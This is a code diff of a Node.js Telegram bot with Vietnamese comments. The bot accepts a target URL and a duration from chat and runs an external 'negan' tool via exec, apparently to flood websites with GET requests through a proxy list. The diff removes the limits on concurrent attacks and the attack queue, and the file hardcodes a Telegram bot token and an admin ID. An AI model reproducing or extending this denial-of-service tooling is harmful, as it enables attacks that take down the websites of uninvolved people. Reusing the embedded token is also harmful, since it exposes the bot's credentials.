@@ -4,12 +4,9 @@ const { exec } = require('child_process');
 const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
 const adminId = 1243471275;
 const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
-const maxConcurrentAttacks = 3; // Giới hạn số lệnh đồng thời toàn hệ thống
-const maxSlot = 1; // Mỗi tài khoản chỉ có thể chạy 1 lệnh đồng thời
-const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi lệnh
+const maxTimeAttacks = 120; // Giới hạn thời gian tối đa cho mỗi lệnh
 
 const bot = new TelegramBot(token, { polling: true });
-const currentAttacks = new Map(), attackQueue = [];
 
 bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
 console.log('[DEBUG] Bot has started and is ready to receive commands.');
@@ -42,8 +39,6 @@ const executeCommand = async (chatId, command, host, time, username) => {
         const endTime = getVietnamTime();
         const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime };
         sendJsonMessage(chatId, completeMessage);
-        currentAttacks.delete(chatId);
-        if (attackQueue.length > 0) executeCommand(...attackQueue.shift());
     });
 };
 
@@ -58,19 +53,6 @@ bot.on('message', async (msg) => {
         if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
         if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
 
-        // Kiểm tra số lệnh đang chạy của người dùng hiện tại
-        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
-        if (userAttacks >= maxSlot) {
-            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.`, { parse_mode: 'HTML' });
-        }
-
-        // Kiểm tra số lệnh đang chạy toàn hệ thống
-        if (currentAttacks.size >= maxConcurrentAttacks) {
-            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
-            return bot.sendMessage(chatId, '⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...', { parse_mode: 'HTML' });
-        }
-
-        currentAttacks.set(chatId, { user: chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, startTime: Date.now() });
         executeCommand(chatId, `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username);
         return;
     }
